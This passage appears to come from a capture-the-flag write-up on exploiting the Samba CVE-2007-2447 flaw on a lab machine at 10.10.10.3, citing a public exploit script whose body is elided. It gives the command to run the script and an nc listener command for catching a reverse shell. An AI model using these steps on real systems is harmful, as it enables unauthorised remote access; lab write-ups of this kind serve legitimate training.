...
#### Technique 2: Using Exploit Script
Script taken from [amriunix](https://github.com/amriunix/CVE-2007-2447)
```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
...
```
Note: this script needs ```pip install --user pysmb```

So we run ```python exploit.py 10.10.10.3 139 local_ip port``` and set up a listener with ```nc -nvlp port```
Doing this will get reverse shell where we can do the steps in approach above to get flags.
